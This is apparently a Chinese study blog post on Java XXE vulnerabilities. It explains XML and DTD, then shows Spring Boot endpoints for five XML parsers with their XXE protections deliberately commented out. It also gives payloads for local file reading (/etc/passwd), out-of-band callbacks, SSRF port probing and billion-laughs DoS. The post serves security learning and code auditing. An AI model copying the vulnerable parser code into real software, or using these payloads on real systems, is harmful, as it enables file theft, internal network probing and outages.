---
title: JavaXXE
description: 本文章详细记录JavaXXE的漏洞利用原理。
date: 2025-01-08
image: cover.png
categories:
    - cate1
tags:
    - Java
    - XXE
---

## 前言

​	最近的几场比赛出现了XXE的题目，让我认识到了自己在XXE方面的知识点十分薄弱，所以就花时间深入学习一下XXE的知识点。

## XML简介

​	在正式开始了解XXE之前我们需要先知道什么是XML

### XML

​	XML(Extensible Markup Language）：可扩展标记语言，用来存储及传输信息。XML 的一个主要优点是它允许不同的应用程序之间进行数据交换，因为它是一种通用的数据格式。它还可以用于存储数据，并且可以使用 XML 文档来描述数据的结构。

​	如下是一个描述书籍的XML文档：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE book SYSTEM "book.dtd">
<book id="1">
    <name>Code Audit</name>
    <author>hada</author>
    <description lang="CN">hada的代码审计</description>
    <tags>
        <tag>Java</tag>
        <tag>Code Audit</tag>
    </tags>
    <pubDate/>
</book>
```

### DTD	

​	DTD是文档类型定义的缩写。它是一种用来定义XML文档结构的文本文件，用于描述XML文档中元素的名称、属性和约束关系。DTD可以帮助浏览器或其他应用程序更好地解析和处理XML文档。

​	例如，下面是一个简单的DTD，它描述了一个XML文档，其中包含名为"book"的元素，其中包含一个名为"title"的元素和一个名为"author"的元素：

```xml-dtd
<!ELEMENT book (title, author)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
```

​	这个DTD声明了"book"元素包含一个"title"元素和一个"author"元素，"title"和"author"元素都只包含文本数据（#PCDATA）。因此，下面的XML文档是有效的：

```xml-dtd
<book> 
	<title>Code Audit</title> 
	<author>hada</author> 
</book>
```

​	而下面这个则是无效的，因为他不包含"author"元素：

```xml-dtd
<book> 
	<title>Code Audit</title> 
</book>
```

#### 内部的 DOCTYPE 声明

​	内部的DOCTYPE声明是指将DTD定义直接包含在XML文档中的DOCTYPE声明。这种声明方式通常被称为"内部子集"。形式类似于Java中直接将类写在同一个文件中。内部的DOCTYPE声明的一般形式如下：

```xml
<!DOCTYPE root-element [ 
    DTD-definition 
]>
```

​	其中，root-element 是 XML 文档的根元素，DTD-definition 是 DTD 的定义，包括元素名称、属性和约束关系。

​	例如，如果XML文档的根元素是 "book"，并且 DTD 定义如下：

```xml-dtd
<!ELEMENT book (title, author)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
```

​	那么内部的DOCTYPE声明可能如下所示：

```xml
<!DOCTYPE book [ 
	<!ELEMENT book (title, author)> 
	<!ELEMENT title (#PCDATA)> 
	<!ELEMENT author (#PCDATA)> 
]>
```

​	内部的 DOCTYPE 声明的优点是它可以使XML文档更具可移植性，因为它不依赖于外部文件。但是，内部的DOCTYPE声明会使XML文档变得较大，并且如果 DTD 定义很复杂，可能会使XML文档变得难以阅读和维护。

#### 外部的 DOCTYPE 声明

​	外部的DOCTYPE声明是指将DTD定义保存在单独的文件中，并在XML文档中通过DOCTYPE声明引用该文件的声明。这种声明方式通常被称为"外部子集"，形式类似于PHP中的include。

​	外部的DOCTYPE声明的一般形式如下：

```xml
<!DOCTYPE root-element SYSTEM "DTD-location">
```

​	其中，root-element是XML文档的根元素，DTD-location是DTD文件的位置。例如，如果XML文档的根元素是"book"，并且DTD文件位于当前目录中的"book.dtd"文件中，那么外部的DOCTYPE声明可能如下所示：

```xml
<!DOCTYPE book SYSTEM "book.dtd">
```

​	外部的DOCTYPE声明的优点是它使XML文档更易于阅读和维护，因为DTD定义保存在单独的文件中，而不是嵌入在XML文档中。此外，外部的DOCTYPE声明使得可以为多个XML文档使用相同的DTD定义。但是，外部的DOCTYPE声明的缺点是它依赖于外部文件，如果DTD文件丢失或损坏，XML文档可能无法正确解析和处理。

​	DOCTYPE 声明不是必需的，但是它很重要，因为它可以帮助浏览器或其他应用程序正确地解析和处理XML文档。

## 什么是XXE？

​	XXE（XML External Entity），即XML外部实体注入漏洞。XXE漏洞发生于应用程序在解析XML时，没有对恶意内容进行过滤，导致可造成[文件读取](https://so.csdn.net/so/search?q=文件读取&spm=1001.2101.3001.7020)，命令执行，攻击内网网站，内网端口扫描，进行DOS攻击等危害。

​	例如，假设应用程序接收用户提交的XML文档，并使用XML处理器解析它：

```xml-dtd
Copy codePOST /submit-xml HTTP/1.1 
Content-Type: application/xml 
<user> 
<name>hada</name> 
<email>test@test.com</email> 
</user>
```

​	如果XML处理器没有正确配置，它会解析下面这个外部实体，最终会将 /etc/passwd 文件的内容包含到XML文档中，有可能会返回给前端。

```xml-dtd
Copy codePOST /submit-xml HTTP/1.1
Content-Type: application/xml
<?xml version="1.0" encoding="UTF-8" ?> 
<!DOCTYPE user [ 
	<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<user> 
    <name>hada</name> 
    <email>test@test.com</email> 
</user>
```

​	在这个例子中，攻击者定义了一个名为 xxe 的外部XML实体，并将它引用到了XML文档的 name 字段中。如果XML处理器没有正确配置，攻击者可以提交包含XXE漏洞的XML文档来实现读取敏感文件：

## Java中XXE漏洞支持的协议

​	Java中的XXE支持sun.net.www.protocol 里的所有协议：

> - http
> - https
> - file
> - ftp
> - mailto
> - jar
> - netdoc

## Java常用XML解析API示例

​	想要学习JavaXXE 漏洞代码审计，首先要先熟悉 XML 解析API。

​	常见的JavaXML解析有以下几种方式：1、DOM解析；2、SAX解析；3、JDOM解析；4、DOM4J解析；5、Digester解析

​	在 Java 语言中，常见的 XML 解析器有：

> 1. DOM (Document Object Model) 解析：这是一种基于树的解析器，它将整个 XML 文档加载到内存中，并将文档组织成一个树形结构。
>
> 2. SAX (Simple API for XML) 解析：这是一种基于事件的解析器，它逐行读取 XML 文档并触发特定的事件。
>
> 3. JDOM 解析：这是一个用于 Java 的开源库，它提供了一个简单易用的 API 来解析和操作 XML 文档。
>
> 4. DOM4J 解析：DOM4J 是一个 Java 的 XML API，是 JDOM 的升级品，用来读写 XML 文件的。
> 5. Digester 解析：Digester 是 Apache 下一款开源项目。Digester 是对 SAX 的包装，底层是采用的是 SAX 解析方式。

​	**其中，DOM 和 SAX 为原生自带的。JDOM、DOM4J 和 Digester 需要引入第三方依赖库。**

​	接下来就通过代码来熟悉这些API，首先创建一个springboot项目，选择maven工程。

​	这里先给出两个参数，便于后续测试。

正常用户传入XML文档。

```xml
<?xml version="1.0" encoding="UTF-8" ?> 
<book id="1">
    <name>Code Audit</name>
    <author>hada</author>
    <description lang="CN">hada的代码审计</description>
    <tags>
        <tag>Java</tag>
        <tag>Code Audit</tag>
    </tags>
    <pubDate/>
</book>
```

​	恶意payload：

```xml
<?xml version="1.0" encoding="UTF-8" ?> 
<!DOCTYPE user [ 
	<!ENTITY xxe SYSTEM "http://www.example.org"> 
]>
<user> 
    <xxe>&xxe;</xxe>
</user>
```

### DOM

​	DOM的全称是Document Object Model，也即文档对象模型。DOM 解析是将一个 XML 文档转换成一个 DOM 树，并将 DOM 树放在内存中。

使用大致步骤：

> 1. 创建一个 DocumentBuilderFactory 对象
> 2. 创建一个 DocumentBuilder 对象
> 3. 通过 DocumentBuilder 的 parse() 方法加载 XML
> 4. 遍历 name 和 value 节点

​	创建一个DOMtest文件，并键入下列代码。

```java
package com.example.javaxxetest;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

@RestController
public class DOMtest {
    @RequestMapping("/xxe/dom")
    public String xxeDom(HttpServletRequest request) {
        try {
            InputStream in = request.getInputStream();
            String body = convertStreamToString(in);
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            Document document = db.parse(is);
            StringBuilder buf = new StringBuilder();
            // 获取根元素
            Element rootElement = document.getDocumentElement();
            if (rootElement.getNodeName().equals("book")) {
                NodeList childNodes = rootElement.getChildNodes();
                for (int j = 0; j < childNodes.getLength(); j++) {
                    Node childNode = childNodes.item(j);
                    if (childNode.getNodeType() == Node.ELEMENT_NODE) {
                        buf.append(String.format("%s: %s<br>", childNode.getNodeName(), childNode.getTextContent().trim()));
                    }
                }
            }
            return buf.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (ParserConfigurationException e) {
            throw new RuntimeException(e);
        } catch (SAXException e) {
            throw new RuntimeException(e);
        }
    }

    private String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

### SAX 

​	SAX 的全称是 Simple APIs for XML，也即 XML 简单应用程序接口。与 DOM 不同，SAX 提供的访问模式是一种顺序模式，这是一种快速读写 XML 数据的方式。

​	使用大致步骤：

> 1. 获取 SAXParserFactory 的实例
> 2. 获取 SAXParser 实例
> 3. 创建一个 handler() 对象
> 4. 通过 parser 的 parse() 方法来解析 XML

​	新建一个SAXtest文件并键入如下代码：

```java
package com.example.javaxxetest;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.Attributes;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

@RestController
public class SAXtest {

    @RequestMapping("/xxe/SAX")
    public String SAXtest(HttpServletRequest request) throws IOException {
        InputStream in = request.getInputStream();
        String body = convertStreamToString(in);
        try {
            SAXParserFactory spf = SAXParserFactory.newInstance();
            // 禁用外部实体解析以防止XXE攻击
//            spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
//            spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
//            spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
//            spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
//            spf.setXIncludeAware(false);
//            spf.setExpandEntityReferences(false);
            SAXParser parser = spf.newSAXParser();
            SAXHandler handler = new SAXHandler();
            // 解析xml
            parser.parse(new InputSource(new StringReader(body)), handler);
            return handler.getResult();
        } catch (Exception e) {
            e.printStackTrace();
            return "Error......";
        }
    }

    private String convertStreamToString(InputStream is) throws IOException {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }

    // 自定义的SAX处理器
    private static class SAXHandler extends DefaultHandler {
        private StringBuilder result = new StringBuilder();
        private boolean bName = false;
        private boolean bAuthor = false;
        private boolean bDescription = false;
        private boolean bTag = false;

        @Override
        public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if (qName.equalsIgnoreCase("name")) {
                bName = true;
            }
            if (qName.equalsIgnoreCase("author")) {
                bAuthor = true;
            }
            if (qName.equalsIgnoreCase("description")) {
                bDescription = true;
            }
            if (qName.equalsIgnoreCase("tag")) {
                bTag = true;
            }
        }

        @Override
        public void characters(char ch[], int start, int length) throws SAXException {
            if (bName) {
                result.append("Name: ").append(new String(ch, start, length)).append("\n");
                bName = false;
            }
            if (bAuthor) {
                result.append("Author: ").append(new String(ch, start, length)).append("\n");
                bAuthor = false;
            }
            if (bDescription) {
                result.append("Description: ").append(new String(ch, start, length)).append("\n");
                bDescription = false;
            }
            if (bTag) {
                result.append("Tag: ").append(new String(ch, start, length)).append("\n");
                bTag = false;
            }
        }

        @Override
        public void endElement(String uri, String localName, String qName) throws SAXException {
            // 可以在这里处理结束元素
        }
        public String getResult() {
            return result.toString();
        }
    }
}
```

### JDOM

​	JDOM 是一个开源项目，它基于树型结构，利用纯 JAVA 的技术对 XML 文档实现解析、生成、序列化以及多种操作。

​	使用大致步骤：

> 1. 创建一个 SAXBuilder 的对象
> 2. 通过 saxBuilder 的 build() 方法，将输入流加载到 saxBuilder 中

​	使用 JDOM 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：

```xml
<dependency>
    <groupId>org.jdom</groupId>
    <artifactId>jdom2</artifactId>
    <version>2.0.6</version>
</dependency>
```

​	创建一个JDOMtest文件，并键入如下代码：

```java
package com.example.javaxxetest;

import org.jdom2.Document;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

@RestController
public class JDOMtest {

    @RequestMapping("/xxe/JDOM")
    public String jdomDemo(HttpServletRequest request) throws IOException {
        // 获取输入流
        InputStream in = request.getInputStream();
        String body = convertStreamToString(in);
        try {
            SAXBuilder builder = new SAXBuilder();
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();

            // 禁用外部实体解析以防止XXE攻击
//            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
//            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
//            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
//            xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
//            xmlReader.setProperty("http://xml.org/sax/properties/lexical-handler", null);
//
//            builder.setXMLReader(xmlReader);
            Document document = builder.build(new InputSource(new StringReader(body)));
            return document.toString();
        } catch (JDOMException | SAXException e) {
            e.printStackTrace();
            return "Error......";
        }
    }

    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

### DOM4J

​	Dom4j 是一个易用的、开源的库，用于XML，XPath 和 XSLT。它应用于Java平台，采用了Java集合框架并完全支持 DOM，SAX 和 JAXP。是 Jdom 的升级品

​	使用大致步骤：

> 1. 创建 SAXReader 的对象 reader
> 2. 通过 reader 对象的 read() 方法加载 xml 文件

​	使用 JDOM 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：

```xml
<dependency>
    <groupId>org.dom4j</groupId>
    <artifactId>dom4j</artifactId>
    <version>2.1.3</version>
</dependency>
```

​	创建DOM4Jtest文件，并键入如下代码：

```java
package com.example.javaxxetest;

import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

@RestController
public class DOM4Jtest {

    @RequestMapping("/xxe/DOM4J")
    public String dom4jDemo(HttpServletRequest request) {
        try {
            // 获取输入流
            InputStream in = request.getInputStream();
            String body = convertStreamToString(in);

            // 创建自定义的 XMLReader
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();

            // 禁用外部实体解析以防止XXE攻击
//            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
//            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
//            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
//            xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
//            xmlReader.setProperty("http://xml.org/sax/properties/lexical-handler", null);

            // 使用自定义的 XMLReader 创建 SAXReader
            SAXReader reader = new SAXReader(xmlReader);
            Document document = reader.read(new InputSource(new StringReader(body)));
            return document.asXML().toString();
        } catch (DocumentException | SAXException | IOException e) {
            e.printStackTrace();
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

### Digester

​	Digester 是 Apache 下一款开源项目。 目前最新版本为 Digester 3.x 。

​	Digester 是对 SAX 的包装，底层是采用的是 SAX 解析方式。

使用大致步骤：

> 1. 创建 Digester 对象
> 2. 调用 Digester 对象的 parse() 解析 XML

​	使用 Digester 需要在 pom.xml 文件中引入该依赖后并重新加载，如下：

```xml
<dependency>
    <groupId>commons-digester</groupId>
    <artifactId>commons-digester</artifactId>
    <version>2.1</version>
</dependency>
```

​	创建一个Digestertest文件，键入如下代码：

```java
package com.example.javaxxetest;

import org.apache.commons.digester.Digester;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.InputStream;
import java.io.StringReader;

@RestController
public class Digestertest {

    @RequestMapping("/xxe/Digester")
    public String Digestertest(HttpServletRequest request) {
        try {
            // 获取输入流
            InputStream in = request.getInputStream();
            String body = convertStreamToString(in);

            // 创建自定义的 XMLReader
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();

            // 禁用外部实体解析以防止XXE攻击
//            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
//            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
//            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
//            xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
//            xmlReader.setProperty("http://xml.org/sax/properties/lexical-handler", null);

            // 使用自定义的 XMLReader 创建 Digester
            Digester digester = new Digester(xmlReader);

            digester.parse(new InputSource(new StringReader(body)));
            return digester.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "EXCEPT ERROR!!!";
        }
    }
    public static String convertStreamToString(java.io.InputStream is) {
        java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}
```

## JavaXXE漏洞利用

### 本地文件读取

**Windows 系统读取文件需要 file:///C:/ （带着盘符）**

**Linux/Unix系统读取文件需要 file:///** 

```xml
<?xml version="1.0"?> 
<!DOCTYPE root [ 
	<!ENTITY file SYSTEM "file:///D:/xxe.txt"> 
]>
<root>&file;</root>
```

### DNSlog

```xml
<?xml version="1.0"?> 
<!DOCTYPE root [ 
	<!ENTITY file SYSTEM "https://www.example.com"> 
]>
<root>&file;</root>
```

### SSRF 探测内网

​	可通过时间响应差异等情况探测内网IP，以及端口开放情况。如果内网存在redis未授权，可以尝试进行组合攻击。

```xml
<?xml version="1.0"?> 
<!DOCTYPE root [ 
	<!ENTITY file SYSTEM "http://127.0.0.1:1234"> 
]>
<root>&file;</root>
```

### DoS 攻击

​	其原理是通过不断迭代增大变量的空间，进而导致内存崩溃。

```xml
<!--?xml version="1.0" ?--> 
<!DOCTYPE lolz [<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)> 
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol; 
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> 
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> 
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> 
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> 
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> 
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> 
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> 
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> 
<tag>&lol9;</tag>
```

**更多可参考： https://github.com/payloadbox/xxe-injection-payload-list** 

## 参考文献

[【Java代码审计】XXE_java xxe-CSDN博客](https://blog.csdn.net/qq_48201589/article/details/136421867?ops_request_misc=%7B%22request%5Fid%22%3A%22c8d94e8777aa15588ac6cc594c411c26%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=c8d94e8777aa15588ac6cc594c411c26&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-136421867-null-null.142^v101^pc_search_result_base6&utm_term=Java XXE&spm=1018.2226.3001.4187)

[java审计-XXE_java xxe-CSDN博客](https://blog.csdn.net/admin741admin/article/details/129757862?ops_request_misc=%7B%22request%5Fid%22%3A%22c8d94e8777aa15588ac6cc594c411c26%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=c8d94e8777aa15588ac6cc594c411c26&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-129757862-null-null.142^v101^pc_search_result_base6&utm_term=Java XXE&spm=1018.2226.3001.4187)